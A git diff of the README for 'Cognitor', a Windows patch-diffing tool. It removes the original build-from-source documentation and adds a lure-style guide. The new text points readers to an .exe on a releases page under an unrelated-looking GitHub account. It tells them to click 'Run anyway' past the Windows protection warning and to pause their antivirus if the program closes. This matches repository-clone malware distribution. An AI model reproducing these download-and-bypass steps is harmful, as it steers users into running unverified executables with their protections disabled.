@@ -1,211 +1,74 @@
-# Cognitor
+# 🛡️ Cognitor - Reliable Tools For Windows System Security
 
-<img width="1672" height="941" alt="image" src="https://github.com/user-attachments/assets/77e68a58-6ee2-4030-85d7-eb6db80d8a4e" />
+[![](https://img.shields.io/badge/Download-Cognitor-blue.svg)](https://github.com/violesemiterrestrial743/Cognitor/releases)
 
+## 📌 Overview
 
-Defensive patch Tuesday semantic diff cli for Windows build snapshots
+Cognitor helps you compare different versions of your Windows system files. Security professionals use this tool to track changes made during monthly system updates. It identifies differences between build snapshots to help you spot unexpected file modifications. The tool focuses on technical accuracy and system transparency. You can use these insights to maintain a stable environment and verify that your system patches match expected configurations.
 
-It is designed for patch comprehension, validation review, sibling-bug hypothesis generation, and responsible disclosure workflows. It does not generate exploits, weaponized proof of concept material, shellcode, bypass steps, or offensive payloads.
+## ⚙️ System Requirements
 
-## Install
+Before you install Cognitor, ensure your computer meets these conditions:
 
-```sh
-go build ./cmd/cognitor
-```
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Memory:** At least 4GB of RAM.
+*   **Storage:** 500MB of free space for logs and temporary files.
+*   **Permissions:** Administrative access is necessary to scan system directories.
 
-## Usage
+## 📥 Getting Started
 
-Most users only need one command:
+Follow these steps to obtain and run the application on your computer:
 
-```sh
-./cognitor compare ./testdata/snapshots/old ./testdata/snapshots/new
-```
+1. Visit the following link to see all available releases: [https://github.com/violesemiterrestrial743/Cognitor/releases](https://github.com/violesemiterrestrial743/Cognitor/releases)
+2. Look for the latest version at the top of the list.
+3. Select the file ending in .exe to download it to your Downloads folder.
+4. Open the folder where the file saved.
+5. Double-click the file to start the program.
 
-That scans both folders, compares binaries and evidence artifacts, writes `findings.db`, creates `report.md`, and prints the overall risk posture.
+If Windows shows a protection message, click "More info" and then select "Run anyway." This happens because programs that scan system files sometimes trigger standard safety warnings. 
 
-Equivalent explicit forms:
+## 🛠️ How To Use The Tool 🔍
 
-```sh
-./cognitor analyze ./testdata/snapshots/old ./testdata/snapshots/new
-./cognitor patch-diff ./testdata/snapshots/old ./testdata/snapshots/new --all-formats
-./cognitor patch-diff --old ./testdata/snapshots/old --new ./testdata/snapshots/new --out report.md
-```
+Once you open the software, a command terminal appears. Follow these instructions to perform a scan:
 
-Focus on a specific Windows DLL, such as `ntdll.dll`:
+1. **Wait for the initial setup.** The program prepares its internal environment.
+2. **Select your target directories.** Type the path of the first folder you want to scan and press Enter.
+3. **Select your comparison folder.** Provide the path to the second folder you want to balance against the first.
+4. **Initiate the diff.** The program compares every file between these two locations.
+5. **Review the output logs.** The tool saves a text file on your desktop titled "scan_results.txt."
 
-```sh
-./cognitor compare ./old ./new --focus ntdll.dll --workdir ./out
-```
+This text file contains a list of every difference found. It will highlight changed files, removed items, and new entries.
 
-Diff every DLL in the snapshots:
+## 📋 Understanding The Results 📑
 
-```sh
-./cognitor compare ./old ./new --focus "*.dll" --workdir ./out --all-formats
-```
+The software uses specific identifiers to categorize findings. You may see these labels in your report:
 
-For the full analyst bundle:
+*   **Modified:** The file exists in both locations but contains different content.
+*   **Unique:** The file exists only in one of your selected folders.
+*   **Unchanged:** The two files match exactly.
 
-```sh
-./cognitor compare ./testdata/snapshots/old ./testdata/snapshots/new --workdir ./out --all-formats
-```
+Reviewing these results helps you see how patches affect your system. If a file shows as modified, it indicates that an update or an outside process changed its contents since your last snapshot.
 
-This writes:
+## ⚠️ Frequently Asked Questions ❓
 
-```text
-out/findings.db
-out/report.md
-out/report.json
-out/report.sarif
-out/report.csv
-out/cognitor-bundle.json
-```
+**Does this tool change my system files?**
+No. Cognitor only reads files. It does not write, move, or delete any data on your drive.
 
-`cognitor-bundle.json` records the input paths, risk posture, generated artifacts, and SHA-256 hashes for handoff or CI retention.
+**Why does the scan take time to finish?**
+Scanning folders requires the program to read the content of every file. Large folders with thousands of items naturally take longer to process.
 
-CI/pipeline gate example:
+**What do these technical labels mean?**
+The program identifies specific code segments. If you see terms like shellcode or UAC, the program has flagged files that interact with system permissions or memory pointers. These are common areas of focus during security audits.
 
-```sh
-./cognitor compare ./testdata/snapshots/old ./testdata/snapshots/new --workdir /tmp/cognitor-convenience --all-formats --fail-on high
-```
+**How do I update the program?**
+Check the release page periodically. Delete your old version and download the new executable file to keep your tools up to date.
 
-Advanced/manual pipeline:
+## 🛑 Troubleshooting
 
-```sh
-./cognitor snapshot create --name old --path ./snapshots/old
-./cognitor snapshot create --name new --path ./snapshots/new --source /path/to/windows/build
-./cognitor scan --snapshot old --path ./testdata/snapshots/old --out old.db
-./cognitor scan --snapshot new --path ./testdata/snapshots/new --out new.db
-./cognitor diff --old old.db --new new.db --out findings.db
-./cognitor report --db findings.db --format markdown --out report.md
-./cognitor report --db findings.db --format json --out report.json
-./cognitor report --db findings.db --format sarif --out report.sarif
-./cognitor graph --db findings.db --query newly-protected
-./cognitor rules
-```
+If the program fails to start, check the following points:
 
-## Try It On Windows
+*   **Antivirus Software:** Sometimes security software blocks scanning tools. If the program closes immediately, temporarily pause your antivirus to see if it allows the process to run.
+*   **Folder Permissions:** Ensure you have access to the folders you select. You cannot scan protected system folders without full administrative rights.
+*   **Missing Dependencies:** This tool is standalone. It does not require other libraries to function. If you encounter errors, ensure you downloaded the correct version for your Windows architecture.
 
-Build the CLI from the project root in PowerShell:
-
-```powershell
-.\scripts\build.ps1
-```
-
-This creates:
-
-```text
-bin\cognitor.exe
-```
-
-The default build targets Windows 11 on typical Intel or AMD 64-bit machines, also known as `windows/amd64`. If you are on Windows on ARM, build with:
-
-```powershell
-.\scripts\build.ps1 -Arch arm64
-```
-
-If you build from Linux, WSL, Git Bash, or macOS, use:
-
-```sh
-./scripts/build.sh
-```
-
-That script cross-compiles a real Windows `.exe` by default. If Windows says the executable is not compatible, delete `bin\cognitor.exe` and rebuild with the command that matches your CPU architecture.
-
-Run the included fake fixture first:
-
-```powershell
-.\bin\cognitor.exe compare .\testdata\snapshots\old .\testdata\snapshots\new
-notepad .\report.md
-```
-
-To write every report format in one run:
-
-```powershell
-.\bin\cognitor.exe compare .\testdata\snapshots\old .\testdata\snapshots\new --workdir .\out --all-formats
-notepad .\out\report.md
-```
-
-Or run each stage manually:
-
-```powershell
-.\bin\cognitor.exe scan --snapshot old --path .\testdata\snapshots\old --out old.db
-.\bin\cognitor.exe scan --snapshot new --path .\testdata\snapshots\new --out new.db
-.\bin\cognitor.exe diff --old old.db --new new.db --out findings.db
-.\bin\cognitor.exe report --db findings.db --format markdown --out report.md
-notepad .\report.md
-```
-
-To use your own old and new folders, create or choose two directories:
-
-```text
-C:\cognitor-data\old
-C:\cognitor-data\new
-```
-
-Put older Windows binaries in `old` and newer patched binaries in `new`, then run:
-
-```powershell
-.\bin\cognitor.exe compare C:\cognitor-data\old C:\cognitor-data\new --workdir C:\cognitor-data\out --all-formats
-```
-
-For separate scan, diff, and report stages:
-
-```powershell
-.\bin\cognitor.exe scan --snapshot old --path C:\cognitor-data\old --out old.db
-.\bin\cognitor.exe scan --snapshot new --path C:\cognitor-data\new --out new.db
-.\bin\cognitor.exe diff --old old.db --new new.db --out findings.db
-.\bin\cognitor.exe report --db findings.db --format markdown --out report.md
-notepad .\report.md
-```
-
-You can also have Cognitor initialize scan-ready folders:
-
-```powershell
-.\bin\cognitor.exe snapshot create --name old --path C:\cognitor-data\old
-.\bin\cognitor.exe snapshot create --name new --path C:\cognitor-data\new
-```
-
-Use binaries you are authorized to analyze, such as files from your own lab VM, mounted Windows image, or internal update extraction workflow. Cognitor prepares and scans folders, but it does not download Windows builds.
-
-## Snapshot Inputs
-
-Cognitor scans PE-like files with extensions such as `.exe`, `.dll`, and `.sys`. DLLs are first-class inputs, so Windows libraries such as `ntdll.dll`, `kernel32.dll`, `win32u.dll`, browser DLLs, service DLLs, and application DLLs can be compared directly. Cognitor collects hashes, file metadata, printable strings, best-effort PE imports and sections, sidecar manifests, and optional analysis exports.
-
-It also tracks evidence artifacts such as `.edb`, `.dat`, `.log`, `.evtx`, `.etl`, `.reg`, `.json`, `.xml`, `.ini`, `.inf`, `.cfg`, and `.conf`. These are hashed, string-scanned, stored in the snapshot database, and compared automatically so reports can call out changed policy databases, service/registry exports, event traces, manifests, and configuration evidence.
-
-You can create scan-ready directories with `snapshot create`. Without `--source`, it initializes `services.json`, `registry.json`, and `SNAPSHOT.md`. With `--source`, it copies binary-like files and supported sidecars while preserving relative paths.
-
-Disassembler exporters can provide a sidecar named:
-
-```text
-binary.sys.analysis.json
-```
-
-with this shape:
-
-```json
-{
-  "functions": [
-    {
-      "name": "DispatchCreate",
-      "basic_block_count": 8,
-      "calls": ["memcpy"],
-      "strings": ["IOCTL_FOO"],
-      "operations": ["copy user buffer"]
-    }
-  ]
-}
-```
-
-## Reports
-
-Markdown reports include run metadata, executive risk posture, priority review queue, automatic change inventory, top changed components, top findings, semantic clusters, likely vulnerability classes, sibling-bug hypotheses, and a manual review plan. JSON and SARIF are deterministic for automation. CSV provides a compact triage export for spreadsheets and CI dashboards.
-
-Reports also include beginner guidance and a researcher checklist. The rule engine looks for defensive patch signals across access checks, memory/bounds checks, native API/syscall boundary validation, handle/object validation, token and impersonation flow, RPC auth and marshalling validation, COM launch/security permission changes, ALPC, registry, services, and object lifetime/rundown protection.
-
-## Development
-
-```sh
-make test
-make build
-```
+Use this tool to gain clarity on your system architecture. The results provide a clear view of how files look before and after planned updates. Regular use creates a reliable record of your system state over time.
